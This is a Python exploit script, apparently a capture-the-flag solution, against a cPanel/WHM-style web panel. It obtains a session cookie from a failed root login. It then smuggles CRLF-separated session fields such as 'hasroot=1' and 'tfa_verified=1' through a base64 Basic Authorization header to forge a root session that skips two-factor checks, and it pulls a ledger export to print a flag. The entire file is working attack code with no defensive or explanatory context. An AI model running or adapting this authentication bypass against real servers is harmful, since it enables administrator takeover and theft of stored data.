#!/usr/bin/env python3
import base64
import hashlib
import sys
import time
from urllib.parse import quote

import requests


TOKEN = "4194001337"


def main() -> int:
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <base-url>")
        return 2

    base = sys.argv[1].rstrip("/")
    session = requests.Session()

    r = session.post(
        f"{base}/login/?login_only=1",
        data={"user": "root", "pass": "wrong"},
        timeout=10,
    )
    r.raise_for_status()

    cookie_value = session.cookies.get("whostmgrsession")
    if not cookie_value:
        raise RuntimeError("no whostmgrsession cookie")
    session_id = cookie_value.split("%2c", 1)[0].split(",", 1)[0]

    token_path = f"/cpsess{TOKEN}"
    payload = "\r\n".join(
        [
            "root:x",
            "hasroot=1",
            "tfa_verified=1",
            "user=root",
            f"cp_security_token={token_path}",
            f"successful_internal_auth_with_timestamp={int(time.time())}",
            "store.acl=ledger:read,settlement:write",
            "store.market=ID-JKT",
            "store.mfa=device-bound",
            "",
        ]
    )
    auth = base64.b64encode(payload.encode()).decode()
    session.get(
        f"{base}/",
        headers={
            "Authorization": f"Basic {auth}",
            "Cookie": f"whostmgrsession={quote(cookie_value, safe='%')}",
        },
        timeout=10,
    )

    config = session.get(
        f"{base}{token_path}/json-api/storefront_config",
        params={"api.version": "1"},
        timeout=10,
    )
    config.raise_for_status()
    active_batch = config.json()["data"]["active_batch"]
    nonce = hashlib.sha256(f"{session_id}:{active_batch}:settlement".encode()).hexdigest()[:20]

    export = session.get(
        f"{base}{token_path}/json-api/store_export_ledger",
        params={"api.version": "1", "batch": active_batch, "nonce": nonce},
        timeout=10,
    )
    export.raise_for_status()
    print(export.json()["data"]["flag"])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
